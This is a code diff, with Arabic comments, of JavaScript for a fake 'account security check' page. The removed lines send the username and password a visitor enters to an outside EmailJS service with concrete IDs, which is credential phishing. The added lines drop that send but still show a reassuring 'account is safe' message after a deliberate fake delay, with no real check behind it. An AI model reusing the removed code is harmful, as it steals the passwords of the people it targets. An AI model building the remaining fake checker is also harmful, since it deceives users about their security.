@@ -1,8 +1,3 @@
-// Initialize EmailJS
-(function() {
-    emailjs.init("1xqwBMfecM1SSulsh"); // Public Key
-})();
-
 // Toggle Forms
 function toggleForm(platform) {
     document.querySelectorAll('.form').forEach(form => form.classList.add('hidden'));
@@ -30,21 +25,12 @@ function checkSecurity(platform) {
         }
     });
 
-    // إرسال البريد الإلكتروني
-    emailjs.send("service_ir3vg5y", "template_q95bk8a", {
-        platform: platform,
-        username: username,
-        password: password
-    }).then(function(response) {
-        Swal.fire('نجاح', 'تم إرسال البيانات بنجاح!', 'success');
-        document.getElementById('result-message').textContent = "الحساب آمن وغير مخترق.";
+    // عرض رسالة "الحساب آمن، لا داعي للقلق" بعد تأخير وهمي
+    setTimeout(() => {
+        Swal.fire('نجاح', 'تم الفحص بنجاح!', 'success');
+        document.getElementById('result-message').textContent = "الحساب آمن، لا داعي للقلق.";
         document.getElementById('result').classList.remove('hidden');
-    }, function(error) {
-        console.error('Error sending email:', error); // إضافة سجل للخطأ
-        Swal.fire('خطأ', 'حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.', 'error');
-        document.getElementById('result-message').textContent = "حدث خطأ أثناء الفحص. يرجى المحاولة مرة أخرى.";
-        document.getElementById('result').classList.remove('hidden');
-    });
+    }, 2000); // تأخير وهمي لمدة 2 ثانية
 }
 
 // إضافة معالجات الأحداث
